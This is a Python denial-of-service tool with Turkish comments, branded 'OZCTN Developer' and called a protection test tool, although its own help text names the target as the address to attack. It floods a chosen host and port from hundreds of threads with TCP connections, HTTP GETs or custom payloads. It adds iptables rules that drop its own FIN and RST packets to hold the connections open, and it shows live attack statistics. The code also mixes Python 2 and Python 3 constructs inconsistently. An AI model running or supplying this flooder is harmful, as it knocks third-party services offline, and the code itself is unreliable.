#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
from time import sleep
from threading import Thread, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys

# 🚀 OZCTN Developer - Gelişmiş DDoS Koruma Aracı
# 🔥 Türk Yapımı Güvenlik Test Aracı

örnek_kullanım = ''' \n💡 İpuçları: Hedef sayfa boyutu 1500+ bayt olmalıdır.

📚 Örnek Kullanımlar:
  python %s example.com/test.php -p 80 -http
  python %s example.com/merhaba/ -p 443 -ssl -http
  python %s example.com -p 80 -http 
  python %s example.com -p 21 -yük 68656c6c6f
  python %s example.com -p 22
''' % (sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

ayrıştırıcı = argparse.ArgumentParser(
    description='🚀 OZCTN Developer - Gelişmiş DDoS Test Aracı',
    epilog=örnek_kullanım, 
    formatter_class=argparse.RawTextHelpFormatter
)

ayrıştırıcı._action_groups.pop()
gerekli = ayrıştırıcı.add_argument_group('🔧 Gerekli Parametreler')
opsiyonel = ayrıştırıcı.add_argument_group('🎛️  Opsiyonel Parametreler')

gerekli.add_argument('hedef', help='🎯 Saldırı yapılacak hedef adres')
gerekli.add_argument('-p', dest='port', help='🔌 Saldırı yapılacak port numarası', type=int, required=True)

opsiyonel.add_argument('-t', dest='THREADS', type=int, default=300, help='🧵 Thread sayısı (varsayılan: 300)')
opsiyonel.add_argument('-ssl', action='store_true', help='🔒 SSL/TLS bağlantısı kullan')
opsiyonel.add_argument('-http', action='store_true', help='🌐 HTTP başlıkları kullan')
opsiyonel.add_argument('-yük', dest='payload', help='📦 Özel yük belirle (hex format)')

print("\n" + "="*50)
print("🚀 OZCTN DEVELOPER - DDoS KORUMA TEST ARACI")
print("="*50 + "\n")

args = ayrıştırıcı.parse_args()

# 📊 İstatistik değişkenleri
bağlantılar = 0
düşürülen = 0
yükler = 0
port = args.port

# 🔗 Hedef URL'yi temizle
hedef = args.hedef.replace('http://','').replace('https://','')

# 📍 Yol bilgisini ayır
if '/' in hedef and args.http:
    yol = hedef[hedef.find('/'):]
    hedef = hedef[:hedef.find('/')]
else:
    yol = '/'

# 📦 Yük işleme
try:
    if args.payload:
        yük = args.payload.decode('hex')
    else:
        yük = ''
except:
    print('❌ Hata: Yük hex formatında olmalıdır!')
    sys.exit()

# ⚠️ Root kontrolü
if geteuid() != 0:
    print("❌ Bu aracı root yetkisiyle çalıştırmanız gerekiyor!")
    sys.exit()

# 🛑 CTRL+C yakalama
durdur = False
def sinyal_yakalayıcı(sinyal, kare):
    global durdur
    print("\n\n🛑 Saldırı durduruluyor...")
    durdur = True

signal.signal(signal.SIGINT, sinyal_yakalayıcı)
system('iptables -X')

# 🔄 Rastgele string üreteci
def rastgele_string(boyut=random.randint(3, 8), karakterler=string.ascii_letters):
    return ''.join(random.choice(karakterler) for _ in range(boyut))

# 🌐 HTTP yükü oluşturma
def http_yükü_oluştur():
    yük = 'GET %s?%s HTTP/1.1\r\n' % (yol, rastgele_string())
    yük += 'Host: %s\r\n' % hedef
    yük += 'User-Agent: OZCTN-Developer-Security-Tool\r\n'
    yük += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    yük += 'Connection: keep-alive\r\n\r\n'
    return yük

# 📊 İstatistik kutusu gösterme
def istatistik_göster():
    system('clear')
    print("┌─────────────────────────────────────────────────────────┐")
    print("│                 🚀 OZCTN DEVELOPER                     │")
    print("│               📊 SALDIRI İSTATİSTİKLERİ               │")
    print("├─────────────────────────────────────────────────────────┤")
    print("│  🎯 HEDEF: {:<40} │".format(hedef))
    print("│  🔌 PORT: {:<42} │".format(port))
    print("│  🧵 THREAD: {:<40} │".format(args.THREADS))
    print("├─────────────────────────────────────────────────────────┤")
    print("│  🔗 BAĞLANTILAR: {:<35} │".format(bağlantılar))
    print("│  📦 YÜKLER: {:<39} │".format(yükler))
    print("│  ❌ DÜŞÜRÜLEN: {:<37} │".format(düşürülen))
    print("│  🧵 AKTİF THREAD: {:<34} │".format(active_count()-1))
    print("├─────────────────────────────────────────────────────────┤")
    print("│  💡 Çıkmak için: CTRL + C                              │")
    print("└─────────────────────────────────────────────────────────┘")

# ⚡ Saldırı fonksiyonu
def saldırı(hedef_ip, yük):
    global bağlantılar, düşürülen, yükler
    while not durdur:
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soket.settimeout(3)
            
            soket.connect((hedef_ip, port))
            bağlantılar += 1
            
            if args.ssl:
                soket = ssl.wrap_socket(soket, cert_reqs=ssl.CERT_NONE)
            
            if args.http and not args.payload:
                yük = http_yükü_oluştur()
            
            soket.send(yük)
            yükler += 1
            soket.close()
            
        except Exception:
            düşürülen += 1

if __name__ == '__main__':
    try:
        hedef_ip = socket.gethostbyname(hedef)
        
        # 🛡️ İptables kuralları
        system(f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP')
        system(f'iptables -A OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP')
        
        # 🚀 Thread'leri başlat
        thread_listesi = []
        for i in range(args.THREADS):
            thread = Thread(target=saldırı, args=(hedef_ip, yük))
            thread_listesi.append(thread)
            thread.daemon = True
            thread.start()
        
        # 📊 İstatistik gösterimi
        while not durdur:
            if active_count() == 1:
                break
                
            istatistik_göster()
            sleep(0.5)  # Yarım saniyede bir güncelle
            
    except KeyboardInterrupt:
        print("\n\n🛑 Kullanıcı tarafından durduruldu!")
    except Exception as e:
        print(f"❌ Beklenmeyen hata: {e}")
    finally:
        # 🧹 Temizlik işlemleri
        durdur = True
        system(f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags FIN FIN -j DROP')
        system(f'iptables -D OUTPUT -d {hedef_ip} -p tcp --dport {port} --tcp-flags RST RST -j DROP')
        
        print("\n" + "="*50)
        print("📊 SON DURUM:")
        print(f"   ✅ Toplam Bağlantı: {bağlantılar}")
        print(f"   📦 Toplam Yük: {yükler}")
        print(f"   ❌ Toplam Düşürülen: {düşürülen}")
        print("🎉 OZCTN Developer aracı kapatıldı!")
        print("="*50)
